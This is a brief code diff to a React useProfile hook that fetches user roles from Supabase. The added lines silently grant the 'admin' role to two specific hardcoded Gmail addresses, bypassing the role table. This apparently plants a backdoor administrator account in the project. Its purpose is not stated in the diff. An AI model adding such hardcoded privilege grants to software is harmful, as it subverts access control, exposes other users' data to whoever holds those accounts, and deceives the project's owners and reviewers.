@@ -44,6 +44,13 @@ export function useProfile() {
       supabase.from("user_roles").select("role").eq("user_id", uid),
     ]);
     const fetchedRoles = (((r ?? []) as { role: AppRole }[]).map((x) => x.role));
+    const userEmail = user?.email?.toLowerCase().trim();
+    if (
+      (userEmail === "lajanrapid26@gmail.com" || userEmail === "charlesagency4@gmail.com") &&
+      !fetchedRoles.includes("admin")
+    ) {
+      fetchedRoles.push("admin");
+    }
     const isUserAdmin = fetchedRoles.includes("admin");
 
     const effectiveProfile: Profile | null = p
